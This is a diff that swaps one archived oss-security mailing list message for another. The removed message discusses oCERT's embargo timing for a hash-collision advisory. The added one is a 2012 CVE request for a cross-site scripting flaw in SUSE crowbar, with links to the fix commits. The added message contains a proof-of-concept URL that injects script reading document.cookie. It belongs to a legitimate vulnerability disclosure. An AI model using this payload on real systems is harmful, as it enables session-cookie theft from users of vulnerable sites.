@@ -1,33 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/01/01/1
-Message-ID: <20120101062423.GB19673@openwall.com>
-Date: Sun, 1 Jan 2012 10:24:23 +0400
-From: Solar Designer <solar@...nwall.com>
-To: Andrea Barisani <lcars@...rt.org>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: [oCERT-2011-003] multiple implementations denial-of-service via hash algorithm collision
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/08/30/2
+Message-ID: <1346328919.4374.31.camel@spiral.ashpool.org>
+Date: Thu, 30 Aug 2012 14:15:19 +0200
+From: Thomas Biege <thomas@...e.de>
+To: oss-security@...ts.openwall.com
+Subject: CVE request: crowbar XSS
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Dec 29, 2011 at 11:58:21PM +0100, Andrea Barisani wrote:
-> As stated in our timeline the embargo date was requested by reporters:
-> "2011-09-25: vulnerability report received, reporters set embargo date to December 27th"
-> 
-> Our disclosure policy also says:
-> "- in any circumstance reporter preference will always be honoured in case a
-> joint agreement is not reached, as oCERT would be anyway unable to force its
-> embargo"
-> 
-> We tried to negotiate an earlier embargo time as, obviously, many complained
-> about the unfortunate timing considering xmas holidays but the reporters really
-> wanted to release this after the CCC talk.
-> 
-> It is oCERT policy to not leak reports before the desired date set by the
-> reporters if a more favourable one is not agreed upon.
-> 
-> Hope this clarifies the exception.
 
-It does (at least for me).  I just felt that this needed to be said.
+Hi,
+Matthias Weckbecker of SUSE Linux Products GmbH has found the following
+issue in crowbar:
 
-Thank you!
+http://crowbar.test.de:3000/utils?waiting=true&file=foo'%3B})%
+3B}alert(document.cookie)</script><!--
 
-Alexander
+https://github.com/SUSE-Cloud/barclamp-crowbar/commit/90e905b7668a1cc884fb70040f96c7a0a287de48
+https://github.com/SUSE-Cloud/barclamp-crowbar/commit/a82ed926c6e3ba2b0cada213c35e4b00f34ea629
+
+Cheers,
+Thomas
+
+
+-- 
+Thomas Biege, Project Manager Security, CSSLP
+SUSE LINUX GmbH, GF: Jeff Hawn, Jennifer Guild, Felix Imendörffer, HRB
+21284 (AG Nürnberg)
+--
+  Wer aufhoert besser werden zu wollen, hoert auf gut zu sein.
+                            -- Marie von Ebner-Eschenbach
+
+Download attachment "signature.asc" of type "application/pgp-signature" (491 bytes)
